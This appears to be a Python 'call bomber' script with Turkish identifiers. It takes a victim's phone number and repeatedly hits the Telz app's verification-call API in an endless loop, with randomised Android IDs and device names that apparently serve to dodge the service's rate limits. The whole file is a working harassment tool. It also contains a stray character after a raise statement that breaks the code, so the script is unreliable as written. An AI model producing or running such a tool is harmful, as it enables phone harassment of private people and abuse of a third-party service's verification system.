import requests,json,time,uuid
from threading import Lock
from cfonts import render

print("\033[?25l")

print(render('NOXRATE', colors=['cyan','white'], align='center', font='simple3d'))
print(render('V2', colors=['cyan'], align='center', font='tiny'))

print("\033[90m" + "─" * 60 + "\033[0m")
print("\033[97m        NoxRate Call Bomber V2\033[0m")
print("\033[96m        Developer : Mhzynx\033[0m")
print("\033[90m" + "─" * 60 + "\033[0m\n")

Y = '\033[92m'
S = '\033[45m'
K = '\033[31m'
B = '\033[37m'
G = '\033[1;30;40m'
h = '\033[1m'
c = '\033[96m'

MODE="TEST_RANDOM_IDS"
GOKU=300

class NoxRateCall:
 def __init__(self,limit_seconds=300):
  self.limit_seconds=float(limit_seconds)
  self.last_call={}
  self.lock=Lock()

 def can_call(self,phone):
  current=time.time()
  with self.lock:
   last=self.last_call.get(phone)
   if last is None or (current-last)>=self.limit_seconds:
    self.last_call[phone]=current
    return True
   return False

limiter=NoxRateCall(limit_seconds=GOKU)

class TelzIstemci:
 temelurl="https://api.telz.com/"
 basliklar={'User-Agent':"Telz-Android/17.5.33",'Accept-Encoding':"gzip",'Content-Type':"application/json; charset=UTF-8"}

 def __init__(self,android_id=None,app_version="17.5.33",os_name="android",os_version="15"):
  if MODE=="TEST_RANDOM_IDS" and android_id is None:
   android_id=self.randomAndroidId()
  self.android_id=android_id or "13e50e93a6399e67"
  self.app_version=app_version
  self.os=os_name
  self.os_version=os_version
  self.session_uuid=str(uuid.uuid4())
  self.session=requests.Session()

 @staticmethod
 def randomAndroidId():
  return uuid.uuid4().hex[:16]

 @staticmethod
 def randomCihazAdi():
  brands=["Pixel","Xiaomi","Samsung","OnePlus","Moto"]
  return f"{brands[int(uuid.uuid4().int%len(brands))]}-{uuid.uuid4().hex[:6]}"

 def gonder(self,endpoint,payload,timeout=10.0):
  url=self.temelurl+endpoint
  data=payload.copy()
  data.update({
   "android_id":self.android_id,
   "app_version":self.app_version,
   "os":self.os,
   "os_version":self.os_version,
   "ts":int(time.time()*1000),
   "uuid":self.session_uuid
  })

  resp=self.session.post(url,data=json.dumps(data),headers=self.basliklar,timeout=timeout)

  if resp.status_code==429:
   retry=resp.headers.get("Retry-After","?")
   raise RuntimeError(f"Fazla deneme: {retry} saniye bekle")l

  resp.raise_for_status()
  try:
   return resp.json()
  except:
   return resp.text

 def kimlikListesi(self):
  return self.gonder("app/auth_list",{"event":"auth_list"})

 def calistir(self):
  return self.gonder("app/run",{
   "event":"run",
   "device_name":self.randomCihazAdi(),
   "lang":"tr",
   "network_type":"4G"
  })

 def butonDurum(self):
  return self.gonder("app/stat_btns",{"event":"stat_btns","btn":"on_reg_continue"})

 def numaraDogrula(self,phone):
  return self.gonder("app/validate_phonenumber",{
   "event":"validate_phonenumber",
   "phone":phone,
   "region":"TR"
  })

 def aramaDogrula(self,phone):
  if MODE=="DEBOUNCE" and not limiter.can_call(phone):
   raise RuntimeError(K+f"[!] Bu numaraya yakın zamanda işlem yapıldı. {GOKU}sn bekle")
  return self.gonder("app/auth_call",{
   "event":"auth_call",
   "phone":phone,
   "lang":"tr"
  })

if __name__=="__main__":
 renk_yesil='\033[92m'
 renk_kirmizi='\033[31m'
 renk_beyaz='\033[37m'
 kalin='\033[1m'
 renk_cyan='\033[96m'

 phone=input(kalin+B+'Numara gir (+90xx):'+renk_cyan).strip()

 client=TelzIstemci()

 while True:
  try:
   print(f"{renk_yesil}:"+renk_beyaz,client.kimlikListesi())
   print(f"{renk_yesil}:"+renk_beyaz,client.calistir())
   print(f"{renk_yesil}:"+renk_beyaz,client.butonDurum())
   print(f"{renk_yesil}:"+renk_beyaz,client.numaraDogrula(phone))
   print(f"{renk_yesil}:"+renk_beyaz,client.aramaDogrula(phone))
   time.sleep(20)
  except Exception as e:
   print(f"{renk_kirmizi}Hata:{renk_beyaz} {e}")